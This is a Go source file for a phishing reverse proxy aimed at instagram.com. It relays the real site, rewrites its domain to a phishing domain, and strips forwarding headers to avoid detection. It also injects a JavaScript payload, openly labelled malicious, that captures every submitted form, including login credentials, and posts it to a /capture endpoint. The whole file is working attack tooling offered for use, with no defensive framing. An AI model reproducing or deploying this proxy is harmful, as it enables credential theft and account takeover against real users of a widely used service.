package main

import (
	"bytes"
	"compress/flate"
	"compress/gzip"
	"crypto/tls"
	"io"
	"log"
	"net/http"
	"net/http/httputil"
	"net/url"
	"strings"

	"github.com/andybalholm/brotli"
)

const (
	targetDomain   = "instagram.com"
	phishingDomain = "ex-ample.com" // still confused abt this bit
	jsPayload      = `// Add malicious JS here
document.addEventListener('submit', function(e) {
	fetch('/capture', {
		method: 'POST',
		body: JSON.stringify(Array.from(new FormData(e.target)) 
	});
});`
)

func createProxy() *httputil.ReverseProxy {
	target, _ := url.Parse("https://" + targetDomain)
	proxy := httputil.NewSingleHostReverseProxy(target)

	proxy.Transport = &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	// Modify request from proxy to target
	proxy.Director = func(req *http.Request) {
		req.URL.Scheme = target.Scheme
		req.URL.Host = target.Host
		req.Host = target.Host // Critic for SNI in TLS handshake

		// Reomving those headers make proxy harder to detect
		req.Header.Del("X-Forwarded-Proto")
		req.Header.Del("X-Forwarded-For") // Sets the original IP that made request to proxy
		req.Header.Del("Forwarded")
		req.Header.Del("Via")
	}

	// Modify response from proxy to client
	proxy.ModifyResponse = modifyResponse

	return proxy
}

func modifyResponse(resp *http.Response) error {
	if !strings.Contains(resp.Header.Get("Content-Type"), "text/html") {
		return nil
	}

	encoding := resp.Header.Get("Content-Encoding")
	body, err := decompressBody(resp.Body, encoding)
	if err != nil {
		return err
	}

	modified := bytes.ReplaceAll(body, []byte(targetDomain), []byte(phishingDomain))
	modified = injectJS(modified, jsPayload)

	newBody, err := compressBody(modified, encoding)
	if err != nil {
		return err
	}

	resp.Body = io.NopCloser(bytes.NewReader(newBody))
	resp.Header.Del("Content-Length")
	resp.ContentLength = int64(len(newBody))

	if encoding != "" {
		resp.Header.Set("Content-Encoding", encoding)
	}
	return nil
}

func decompressBody(body io.ReadCloser, encoding string) ([]byte, error) {
	defer body.Close()

	log.Printf("[DECOMPRESS] Encoding: '%s'", encoding)

	switch encoding {
	case "br":
		br := brotli.NewReader(body)
		defer body.Close()
		return io.ReadAll(br)
	case "gzip":
		gr, err := gzip.NewReader(body)
		if err != nil {
			return nil, err
		}
		defer gr.Close()
		return io.ReadAll(gr)
	case "deflate":
		fr := flate.NewReader(body)
		defer fr.Close()
		return io.ReadAll(fr)
	default:
		return io.ReadAll(body)
	}
}

func compressBody(data []byte, encoding string) ([]byte, error) {
	var buf bytes.Buffer

	switch encoding {
	case "br":
		br := brotli.NewWriter(&buf)
		if _, err := br.Write(data); err != nil {
			return nil, err
		}
		br.Close()
	case "gzip":
		gw := gzip.NewWriter(&buf)
		if _, err := gw.Write(data); err != nil {
			return nil, err
		}
		gw.Close()
	case "deflate":
		fw, _ := flate.NewWriter(&buf, flate.BestCompression)
		if _, err := fw.Write(data); err != nil {
			return nil, err
		}
		fw.Close()
	default:
		buf.Write(data)
	}

	return buf.Bytes(), nil
}

func injectJS(body []byte, payload string) []byte {
	return bytes.Replace(body, []byte("</body>"),
		[]byte("<script>"+payload+"</script></body>"), 1)
}
